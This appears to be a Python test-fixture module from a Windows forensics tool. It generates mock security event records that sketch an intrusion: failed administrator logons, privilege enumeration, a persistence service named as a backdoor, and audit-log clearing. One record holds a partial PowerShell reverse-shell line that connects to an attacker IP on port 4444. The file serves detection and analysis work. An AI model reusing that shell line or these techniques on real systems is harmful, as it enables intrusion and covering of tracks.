from datetime import datetime, timedelta
from typing import List

from nevtx.core.models import EventRecord


def generate_mock_events() -> List[EventRecord]:
    """Generates realistic DFIR Windows Event Log records for demonstration & testing."""
    now = datetime.now()

    events = [
        EventRecord(
            record_id=101,
            timestamp=now - timedelta(minutes=45),
            event_id=4624,
            provider="Microsoft-Windows-Security-Auditing",
            channel="Security",
            level="Information",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 4624}}}',
            data={
                "TargetUserName": "jdoe",
                "TargetDomainName": "CORP",
                "LogonType": "2",
                "IpAddress": "192.168.1.55",
                "LogonProcessName": "User32",
            },
            summary="Logon: CORP\\jdoe (Type: 2 - Interactive)",
        ),
        EventRecord(
            record_id=102,
            timestamp=now - timedelta(minutes=30),
            event_id=4625,
            provider="Microsoft-Windows-Security-Auditing",
            channel="Security",
            level="Warning",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 4625}}}',
            data={
                "TargetUserName": "Administrator",
                "TargetDomainName": "CORP",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A",
                "FailureReason": "Unknown user name or bad password",
                "IpAddress": "10.0.0.120",
            },
            summary="Failed Logon: Administrator (Status: 0xC000006D - Bad Password)",
        ),
        EventRecord(
            record_id=103,
            timestamp=now - timedelta(minutes=28),
            event_id=4625,
            provider="Microsoft-Windows-Security-Auditing",
            channel="Security",
            level="Warning",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 4625}}}',
            data={
                "TargetUserName": "Administrator",
                "TargetDomainName": "CORP",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A",
                "IpAddress": "10.0.0.120",
            },
            summary="Failed Logon: Administrator (Status: 0xC000006D - Bad Password)",
        ),
        EventRecord(
            record_id=104,
            timestamp=now - timedelta(minutes=20),
            event_id=4688,
            provider="Microsoft-Windows-Security-Auditing",
            channel="Security",
            level="Information",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 4688}}}',
            data={
                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c whoami /priv",
                "SubjectUserName": "svc_sql",
                "ParentProcessName": "C:\\Windows\\System32\\services.exe",
            },
            tags=["Suspicious", "T1033"],
            summary="Process: cmd.exe /c whoami /priv",
        ),
        EventRecord(
            record_id=105,
            timestamp=now - timedelta(minutes=15),
            event_id=4104,
            provider="Microsoft-Windows-PowerShell",
            channel="Microsoft-Windows-PowerShell/Operational",
            level="Warning",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 4104}}}',
            data={
                "ScriptBlockText": "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.120', 4444); $stream = $client.GetStream();",
                "Path": "",
            },
            tags=["Threat", "T1059.001", "Reverse Shell"],
            summary="ScriptBlock: $client = New-Object System.Net.Sockets.TCPClient('10.0.0.120', 4444)...",
        ),
        EventRecord(
            record_id=106,
            timestamp=now - timedelta(minutes=10),
            event_id=7045,
            provider="Service Control Manager",
            channel="System",
            level="Information",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 7045}}}',
            data={
                "ServiceName": "WindowsUpdaterBackdoor",
                "ImagePath": "C:\\Users\\Public\\updater.exe",
                "ServiceType": "user mode service",
                "StartType": "auto start",
            },
            tags=["Persistence", "T1543.003"],
            summary="New Service: WindowsUpdaterBackdoor -> C:\\Users\\Public\\updater.exe",
        ),
        EventRecord(
            record_id=107,
            timestamp=now - timedelta(minutes=2),
            event_id=1102,
            provider="Microsoft-Windows-Eventlog",
            channel="Security",
            level="Critical",
            computer="DC-CORP.local",
            raw_xml='{"Event": {"System": {"EventID": 1102}}}',
            data={
                "SubjectUserName": "Administrator",
                "SubjectDomainName": "CORP",
                "SubjectLogonId": "0x3e7",
            },
            tags=["Anti-Forensics", "T1070.001", "Log Tampering"],
            summary="Audit Log Cleared: The audit log was cleared by Administrator",
        ),
    ]
    return events
